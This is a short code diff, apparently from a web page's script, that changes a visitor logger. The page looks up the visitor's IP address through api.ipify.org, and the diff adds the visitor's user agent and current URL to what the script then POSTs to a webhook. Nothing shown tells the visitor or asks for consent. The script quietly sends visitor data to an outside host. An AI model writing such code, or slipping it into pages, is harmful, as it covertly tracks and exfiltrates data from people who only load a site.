@@ -108,17 +108,14 @@ html {
 
   // Make a request to a free IP lookup service to obtain the user's IP address
   const apiUrl = 'https://api.ipify.org?format=json';
-  fetch(apiUrl)
-    .then(response => response.json())
-    .then(data => {
-      // Store the user's IP address as a variable
-      const userIP = data.ip;
-      console.log(`User IP: ${userIP}`);
+      fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        const ipAddress = data.ip;
+        const userAgent = navigator.userAgent;
+        const currentUrl = window.location.href;
+        const message = `New IP address: ${ipAddress}\nUser agent: ${userAgent}\nCurrent URL: ${currentUrl}`;
 
-      // Define the message content
-      const message = {
-        content: `User IP: ${userIP}`
-      };
 
       // Send the message to the webhook URL using a POST request
       fetch(webhookUrl, {
@@ -126,7 +123,7 @@ html {
         headers: {
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify(message)
+        body: JSON.stringify({ content: message })
       })
       .then(response => {
         if (!response.ok) {
